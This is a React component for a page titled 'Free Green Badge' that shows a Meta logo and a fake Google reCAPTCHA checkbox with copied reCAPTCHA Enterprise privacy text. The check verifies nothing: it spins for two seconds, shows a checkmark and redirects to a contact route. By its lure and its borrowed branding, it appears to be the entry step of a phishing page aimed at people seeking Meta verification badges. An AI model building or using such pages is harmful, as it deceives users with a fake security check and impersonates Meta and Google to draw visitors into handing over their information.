import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './Live.scss'; // Bắt buộc import file SCSS

const Live = () => {
    const navigate = useNavigate(); 
    const [isLoading, setIsLoading] = useState(false);
    const [isShowCheckMark, setIsShowCheckMark] = useState(false);

    const handleVerify = () => {
        setIsLoading(true);
        setTimeout(() => {
            setIsShowCheckMark(true);
            setIsLoading(false);
        }, 2000);
    };

    useEffect(() => {
        if (isShowCheckMark) {
            const redirectTimeout = setTimeout(() => {
                const currentTime = Date.now();
                navigate(`/contact/${currentTime}`);
            }, 500);
            return () => clearTimeout(redirectTimeout);
        }
    }, [isShowCheckMark, navigate]);

    return (
        <div className="live-wrapper">
            <title>Free Green Badge</title>
            <div className="live-content">
                <img src="/meta-image.png" alt="Meta" className="meta-logo" />
                
                <div className="verify-section">
                    <div className="verify-box">
                        <div className="verify-left">
                            <div className="checkbox-container">
                                <button className="checkbox-btn" onClick={handleVerify}>
                                    <input type="checkbox" className="hidden-input" />
                                    {isLoading ? (
                                        <div className="spinner"></div>
                                    ) : (
                                        <div className={`checkbox-custom ${isShowCheckMark ? 'checked' : ''}`}></div>
                                    )}
                                </button>
                            </div>
                            <div className="verify-text">I'm not a robot</div>
                        </div>
                        <div className="verify-right">
                            <img src="/recaptcha.png" alt="reCAPTCHA" className="recaptcha-logo" />
                            <p className="recaptcha-title">reCAPTCHA</p>
                            <small className="recaptcha-terms">Privacy - Terms</small>
                        </div>
                    </div>
                </div>

                <div className="info-text">
                    <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
                    <p>We’ve used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.</p>
                    <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
                </div>
            </div>
        </div>
    );
};

export default Live;
